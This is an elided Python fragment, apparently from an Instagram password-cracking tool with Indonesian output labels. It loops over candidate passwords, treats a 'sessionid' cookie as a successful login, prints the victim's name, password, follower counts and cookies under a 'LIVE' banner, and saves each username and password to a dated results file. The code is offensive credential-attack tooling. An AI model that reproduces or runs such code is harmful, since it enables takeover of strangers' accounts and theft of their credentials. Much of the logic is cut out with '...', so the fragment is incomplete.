				...
				try:
					...
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						...
						try:
							...
							print("\r                                       ")
							adit=f'\rNAMA      : {nama}\nUSERNAMA  : {user}\nKATASANDI  : {pw}\nPENGIKUT  : {pengikut}\nMENGIKUTI : {mengikut}\nPOSTINGAN : {postingan}\USER-AQUA: {user_agentAPI()}'
							...
							print("\r                                       ")
							adit=f'\rNAMA      : null\nUSERNAMA  : null\nKATASANDI  : null\nPENGIKUT  : null\nMENGIKUTI : null\nPOSTINGAN : null\USER-AQUA: {user_agentAPI()}'
							pepekXD = nel(adit, style='green')
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[green]LIVE-BUL😎[white]'))
		...
		try:
			for pw in pas:
				...
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("\r                                       ")
					adit=f'\rNAMA      : {nama}\nUSERNAMA  : {user}\nKATASANDI  : {pw}\nPENGIKUT  : {pengikut}\nMENGIKUTI : {mengikut}\nPOSTINGAN : {postingan}\USER-AQUA: {uazku()}'
					pepekXD = nel(adit, style='green')
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]LIVE-BUL😎[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
		...
		try:
			for pw in pas:
				...
				if "userId" in str(xc_team) or "sessionid" in ses.cookies.get_dict():
					...
					print("\r                                       ")
					adit=f'\rNama      : {nama}\nUsername  : {user}\nPassword  : {pw}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\User-Agent: {uazku()}\ncookies   : {coki}'
					pepekXD = nel(adit, style='green')
					print('\n')
					cetak(nel(pepekXD,style='',title='\r[green]LIVE-BUL😎[white]'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
